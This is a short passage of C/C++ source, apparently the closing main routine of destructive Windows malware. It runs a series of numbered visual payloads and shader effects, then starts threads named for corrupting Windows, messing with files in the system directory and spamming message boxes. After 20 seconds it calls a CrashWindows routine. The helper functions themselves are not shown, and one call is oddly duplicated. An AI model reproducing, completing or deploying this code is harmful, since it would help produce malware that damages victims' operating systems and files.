	ExecutePayload(Payload1, PAYLOAD_TIME);
	ExecutePayload(Payload2, PAYLOAD_TIME);
	ExecutePayload(Payload3, PAYLOAD_TIME);
	ExecutePayload(Payload4, PAYLOAD_TIME);
	ExecutePayload(Payload5, PAYLOAD_TIME);
	ExecutePayload(Payload6, PAYLOAD_TIME);
	ExecutePayload(Payload7, PAYLOAD_TIME);
	ExecutePayload(Payload8, PAYLOAD_TIME);
	ExecutePayload(Payload9, PAYLOAD_TIME);
	ExecutePayload(Payload10, PAYLOAD_TIME);
ExecutePayload(Payload9, PAYLOAD_TIME);

	ExecuteShader(Shader1, PAYLOAD_TIME);
	ExecuteShader(Shader2, PAYLOAD_TIME);
	ExecuteShader(Shader3, PAYLOAD_TIME);
	ExecuteShader(Shader4, PAYLOAD_TIME);
	ExecuteShader(Shader5, PAYLOAD_TIME);
	ExecuteShader(Shader6, PAYLOAD_TIME);
	ExecuteShader(Shader7, PAYLOAD_TIME);
	ExecuteShader(Shader8, PAYLOAD_TIME);
	ExecuteShader(Shader9, PAYLOAD_TIME);
	ExecuteShader(Shader10, PAYLOAD_TIME);
	ExecuteShader(Shader11, PAYLOAD_TIME);
	ExecuteShader(Shader12, PAYLOAD_TIME);
	ExecuteShader(Shader13, PAYLOAD_TIME);
	ExecuteShader(Shader14, PAYLOAD_TIME);
	ExecuteShader(Shader15, PAYLOAD_TIME);
	ExecuteShader(Shader16, PAYLOAD_TIME);

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(FileMessPayload), (PVOID)SystemDirectory, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
	Sleep(20000);
	CrashWindows();
	return 0;
}
